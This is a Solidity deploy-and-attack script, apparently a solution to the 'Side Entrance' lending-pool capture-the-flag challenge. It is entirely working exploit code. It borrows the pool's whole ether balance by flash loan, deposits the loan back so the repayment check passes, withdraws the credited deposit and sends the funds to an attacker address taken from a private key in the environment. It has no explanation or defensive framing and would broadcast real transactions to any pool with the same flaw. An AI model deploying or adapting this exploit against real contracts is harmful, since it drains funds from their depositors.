// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Script} from "forge-std/Script.sol";
import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import {IFlashLoanEtherReceiver} from "./IFlashLoanEtherReceiver.sol";

contract DeployAndAttackScript is Script {
    SideEntranceLenderPool private sideEntrance;
    address private attacker;

    function setUp() public {
        attacker = vm.rememberKey(vm.envUint('PRIVATE_KEY'));
        sideEntrance = SideEntranceLenderPool(vm.envAddress('CONTRACT'));
    }

    function run() external {
        vm.startBroadcast(attacker);

        Attack attackContract = new Attack(address(sideEntrance));
        attackContract.attack();
        vm.stopBroadcast();
    }
}

contract Attack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable sideEntrance;
    address private immutable attacker;

    constructor(address _sideEntrance) {
        sideEntrance = SideEntranceLenderPool(_sideEntrance);
        attacker = msg.sender;
    }

    function execute() external payable override {
        sideEntrance.deposit{value: msg.value}();
    }

    function attack() external {
        sideEntrance.flashLoan(address(sideEntrance).balance);
        sideEntrance.withdraw();

        (bool success, ) = payable(attacker).call{value: address(this).balance}("");
        require(success, "send failed");
    }

    receive() external payable {}
}
